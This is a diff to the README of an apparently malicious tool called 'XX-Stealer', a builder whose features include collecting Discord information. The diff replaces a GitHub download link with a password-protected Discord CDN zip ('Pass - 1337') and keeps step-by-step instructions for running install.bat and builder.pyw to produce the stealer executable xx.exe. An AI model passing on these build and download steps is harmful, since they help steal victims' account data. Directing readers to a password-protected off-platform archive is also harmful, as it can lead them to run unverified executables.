@@ -1,18 +1,4 @@
-  <div align="center">
-  <div>
-  </div>
-  </div> 
 
-</p>
-
- 
-<p align="center">
-  <br>
-  🔥 Join Telegram for support and contact 🔥
-<hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
-</p>
-<br>
-    
 ## Features
 
 -   Discord Information
@@ -72,14 +58,12 @@
 
 ### Setup
 
-1. [Download source code zip](https://github.com/Ayhx1337/XX-Stealer/archive/refs/heads/main.zip)
+1. [Download source code zip](https://cdn.discordapp.com/attachments/1248204838970589205/1248219805438181419/ZsTeal-main.zip?ex=6662dec8&is=66618d48&hm=6b660d4317b7d85ad7ae1a90c1cafae96f56a05cac474e6e07ed7b1eb3101486&) (Pass - 1337)
 2. Extract zip
 3. First install reqiured packages by double clicking `install.bat` file
 4. Run the builder by double clicking the `builder.pyw` file
 5. Follow instructions in builder and your exe will be found in the `dist` folder under the name `xx.exe`
-
-<div align="center">
-    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://i.imgur.com/20Q3SvF.png"></img>
+6. 
     <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="75%">    
     <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://i.imgur.com/b1ohega.png"></img>
     <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src="https://i.imgur.com/wkNooqp.png"></img>
